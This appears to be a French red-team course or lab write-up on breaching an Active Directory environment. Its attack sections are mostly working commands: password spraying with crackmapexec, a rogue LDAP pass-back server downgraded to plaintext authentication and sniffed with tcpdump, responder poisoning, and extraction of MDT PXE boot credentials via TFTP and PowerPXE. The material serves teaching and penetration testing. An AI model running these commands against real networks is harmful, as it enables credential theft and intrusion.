+++
author = "Enzo"
title = "AD - Comprimission"
date = "2026-03-26"
categories = [
    "Red Team"
]
tags = [
    "Windows",
    "AD",
    "CTF",
    "Cours"
]
+++
# AD : Trouver la faille
## OSINT
OSINT pour Open-Source INTelligence (ou renseignement en source ouvert en français) c'est le fais de rechercher des informations présent sur le web. Cela permet d'avoir des informations plus ou moins privé que la personne aurait pu faire "fuité". Dans le cas d'un AD, on peut penser à des forums où l'admin aurait pu laisser fuité des creds sans faire exprès, pareil pour tout ce qui est GitHub. Ensuite on peut aller voir dans des leaks de BDD 

## Spear-phishing
Le Spear-Phishing est un phishing mais (et toutes les autres formes qui existe comme le vishing par exempe) ciblé, donc nous allons prendre en compte les passes temps de l'admin pour qu'il tombe dans le piège. Le but derrière est de récupérer les identifiants admin ou même faire installer une application malveillante à l'admin. 

## NTLM 
NTLM pour New Technology LAN Manager est une suite de protocole utilisé pour identifier l'identité des utilisateurs dans un AD. Ce protocole repose sur un challenge puis une réponse. 

Malgrès toutes ses vulnérabilitées, NTLM reste largement déployé même sur les nouveaux systèmes, car il reste compatible avec les anciens équipement.

### Attaquer NTLM : Password Spraying
Un password spraying est une attaque qui consiste à utiliser des mots de passe connu, car présent dans un leak ou juste présent car souvent utilisé (comme Password123 par exemple)
````Bash
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
````
- ``-u`` : Désigne une liste d'utilisateur ou un seul, pas obligé de mettre un fichier juste le username suffit. 
- ``-p`` : Désigne la liste de mot de passe. 

## LDAP
LDAP (Lightweight Directory Access Protocol) est un protocole d'identification similaire à NTLM. L’authentification LDAP est similaire à l’authentification NTLM. Cependant, avec LDAP, l’application vérifie directement les identifiants de l’utilisateur. Elle dispose d’une paire d’identifiants AD qu’elle peut utiliser d’abord pour interroger LDAP, puis pour vérifier les identifiants de l’utilisateur AD. Le souci avec LDAP est que les mêmes attaques sont possible que sur NTLM et ces identifiants sont directement lié à un AD. 

### Attaquer LDAP : Pass-Back
Cette attaque consiste à créer serveur LDAP malveillant, ce qui va forcer l'appareil à tenter une authentufucation LDAP vers notre serveur malveillant. Nous pourrons donc intercepter cette tentative d'authentification. 

Elle va se réaliser sur un appareil réseau, ou sur une imprimante du réseau, vu que ces appareils on souvent les identifiants par défaut il suffit de se loggé dessus, changer le serveur LDAP puis de renvoyer une requête. 

Pour réaliser cette attaque il faut créer un serveur LDAP comme ce qui suit : 
````Bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
````
Voila la configuration : 
````Bash
sudo dpkg-reconfigure -p low slapd
> No
> $DOMAIN
> $DOMAIN
> password
> password
> MDB
> No 
> Yes 
````
Une fois le serveur malveillant déployé nous pouvons le tester : 
````Bash
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: DIGEST-MD5
supportedSASLMechanisms: CRAM-MD5
supportedSASLMechanisms: NTLM
````
Maintenant nous devons faire en sorte de downgrade le méchanisme d'authentification : 
````Bash 
nano olcSaslSecProps.ldif

#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
````
Une fois ça fait il suffit de lancer une capture avec ``tcpdump`` : 
````Bash
sudo tcpdump -SX -i breachad tcp port 389
````
Nous y verrons la tentative d'authentification passer en clair grâce au LOGIN,PLAIN déclaré avant.

## LLMNR, NBT-NS & WPAD
Pour exploiter ces protocole nous pouvons utiliser l'outil responder, qui va nous servir de Man In The Middle en empoisonnat les réponse lors de l'authentification. Pour ça nous allons utiliser l'outil ``responder`` : 
````Bash
responder -I <interface-réseau>
````

Une fois le hash du mot de passe récupéré, nous pouvons le cracker grâce à ``hashcat``. 

## MDT et SCCM
MDT et SCCM sont des d'automatisation de parc informatique, MDT (Microsoft Deployment Toolkit) permet d'automatiser le déploiement des machines et SCCM (System Center Configration Manager) va permettre de gérer les mises à jour d'application Microsoft, services et systèmes. MDT est intégré dans SCCM


### PXE Boot
Quand un client obtiens une IP auprès du DHCP, il va envoyer une requête PXE Boot au MDT pour booter desssus. 
Nous pouvons voir quelle image contient le MDT en recherchant l'IP ou le nom DNS de la machine. 

Les fichiers images se trouveront dans les fichiers avec l'extension ``.bcd``. Nous pouvons récupérer ces fichiers pour en extraire des creds admin. Il suffit de recupérer un fichier ``.bcd`` en TFTP. 
````Powershell
tftp -i <MDTIP> GET "\Tmp\x64{...}.bcd" conf.bcd
powershell -executionpolicy bypass
git clone https://github.com/wavestone-cdt/powerpxe.git
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
````
Cette dernière commande va nous retourner un chemin finissant par un fichier en ``.wim``. 
Nous finirons l'exploitation avec les commandes suivantes : 
````Powershell
tftp -i <MDTIP> GET "<PXE Boot Image Location>" pxeboot.wim
Get-FindCredentials -WimFile pxeboot.wim
````
Les identifiants nous serons retourné sous cette commaande de cette forme : 
````
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\MDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
````






